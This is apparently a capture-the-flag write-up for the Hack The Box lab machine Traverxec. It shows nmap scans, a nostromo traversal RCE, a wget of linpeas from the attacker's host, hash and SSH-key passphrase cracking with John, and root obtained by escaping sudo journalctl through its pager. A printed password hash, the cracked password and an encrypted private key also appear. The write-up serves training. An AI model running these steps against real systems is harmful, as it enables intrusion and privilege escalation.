# HTB - Traverxec

#### Ip: 10.10.10.165
#### Name: Traverxec
#### Rating: Easy

----------------------------------------------------------------------

Traverxec.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up:

```text
┌──(ryan㉿kali)-[~/HTB/Traverxec]
└─$ sudo nmap -p- --min-rate 10000 10.10.10.165    
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:56 CDT
Nmap scan report for 10.10.10.165
Host is up (0.068s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```

Lets now scan these open ports using both the `-sV` and `-sC` flags to enumerate versions and to use basic scripts:

```text
┌──(ryan㉿kali)-[~/HTB/Traverxec]
└─$ sudo nmap -sC -sV -T4 10.10.10.165 -p 22,80            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:58 CDT
Nmap scan report for 10.10.10.165
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

Looks like port 80 is running nostromo 1.9.6. Giving that a quick search I find an interesting exploit: https://www.exploit-db.com/exploits/47837. Looks like this version is vulnerable to RCE via a directory traversal.

### Exploitation

This looks pretty straight forward, and I can issue a simple Bash oneliner to get a shell back as www-data:

exploit.png

Looking around the box it appears there is only one user in the `/home` directory, but we can't access the files.

```text
www-data@traverxec:/home$ cd david
cd david
www-data@traverxec:/home/david$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
```

Lets try uploading LinPeas to the box to help enumerate more. First I'll start a Python web server using `python -m http.server 80 ` and then use wget to fetch the file:

```text
www-data@traverxec:/tmp$ wget http://10.10.14.13/linpeas.sh
wget http://10.10.14.13/linpeas.sh
--2023-05-09 15:20:18--  http://10.10.14.13/linpeas.sh
Connecting to 10.10.14.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776967 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  335K 2s
    50K .......... .......... .......... .......... .......... 13%  711K 1s
   100K .......... .......... .......... .......... .......... 19%  854K 1s
   150K .......... .......... .......... .......... .......... 26%  855K 1s
   200K .......... .......... .......... .......... .......... 32% 1.40M 1s
   250K .......... .......... .......... .......... .......... 39%  715K 1s
   300K .......... .......... .......... .......... .......... 46%  710K 1s
   350K .......... .......... .......... .......... .......... 52%  756K 1s
   400K .......... .......... .......... .......... .......... 59% 1.52M 0s
   450K .......... .......... .......... .......... .......... 65% 1.08M 0s
   500K .......... .......... .......... .......... .......... 72%  765K 0s
   550K .......... .......... .......... .......... .......... 79% 1.44M 0s
   600K .......... .......... .......... .......... .......... 85% 1.22M 0s
   650K .......... .......... .......... .......... .......... 92%  843K 0s
   700K .......... .......... .......... .......... .......... 98% 1.45M 0s
   750K ........                                              100% 4.07M=0.9s

2023-05-09 15:20:19 (853 KB/s) - 'linpeas.sh' saved [776967/776967]

www-data@traverxec:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@traverxec:/tmp$ ./linpeas.sh
```

Cool, LinPeas quickly finds an htpasswd for David. 

htpasswd.png

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Lets grab this hash and bring it back locally to crack it:

```text
┌──(ryan㉿kali)-[~/HTB/Traverxec]
└─$ cat >> hash.txt     
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

We can crack the hash using JohnTheRipper:

john.png

This took about 30 minutes to crack, but unfortunately I can't use the credential to SSH as david or to `su david` in our shell. Looks like we'll need to do more enumeration.

Checking out the file nhttpd.conf in `/var/nostromo/conf` we can see there is a public_www directory.

```text
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

Checking out `/home/david/public_www` we find a `/protected-file-area` directory, and inside we find what appear to be SSH keys:

```text
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ tar -tvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
<w/protected-file-area/backup-ssh-identity-files.tgz           
drwx------ david/david       0 2019-10-25 17:02 home/david/.ssh/
-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/authorized_keys
-rw------- david/david    1766 2019-10-25 17:02 home/david/.ssh/id_rsa
-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/id_rsa.pub
```

Let's go ahead and extract the id_rsa file:

```text
www-data@traverxec:/home/david/public_www/protected-file-area$ mkdir /tmp/ssh-keys
<public_www/protected-file-area$ mkdir /tmp/ssh-keys           
www-data@traverxec:/home/david/public_www/protected-file-area$ tar zxvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -C /tmp/ssh-keys
<area/backup-ssh-identity-files.tgz -C /tmp/ssh-keys           
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
www-data@traverxec:/home/david/public_www/protected-file-area$ cat /tmp/ssh-keys/home/david/.ssh/id_rsa
<file-area$ cat /tmp/ssh-keys/home/david/.ssh/id_rsa           
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

After adding this key to a file named id_rsa on my attacking machine, I tried to use it to SSH in as user david, but needed a passphrase. Unfortunately the password Nowonly4me we cracked earlier didn't work here, so looks like it's time to use ssh2john to brute force this passphrase.

```text
┌──(ryan㉿kali)-[~/HTB/Traverxec]
└─$ chmod 600 id_rsa
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Traverxec]
└─$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa':
```

ssh2john.png

Great, john was able to crack the passphrase quickly, and we should be in business to SSH in and grab that user.txt now:

user_flag.png

### Privilege Escalation

In David's home directory, there was a directory called `bin`, and inside there is an interesting bash script called server-stats.sh. Taking a look at the script we can see it is calling journalctl with sudo. 

server_status.png

Lets head over to https://gtfobins.github.io/ to see if we can exploit this.

gtfobins.png

Cool, looks like we're onto something here. Gtfobins states "This invokes the default pager, which is likely to be less, other functions may apply." After Googling around a bit I learned we'll need to declare the number of lines displayed by using `-n 5` which should allow us to then just call `!/bin/bash` to give us root.

Lets try it:

```text
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2023-05-10 10:19:06 EDT, end at Wed 2023-05-10 10:53:36 EDT. --
May 10 10:19:08 traverxec systemd[1]: Starting nostromo nhttpd server...
May 10 10:19:08 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start:
May 10 10:19:08 traverxec nhttpd[507]: started
May 10 10:19:08 traverxec nhttpd[507]: max. file descriptors = 1040 (cur) / 1040 (max)
May 10 10:19:08 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david/bin# whoami
root
```

Great, that worked! All that's left now is to grab the root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

------------------------------------------------
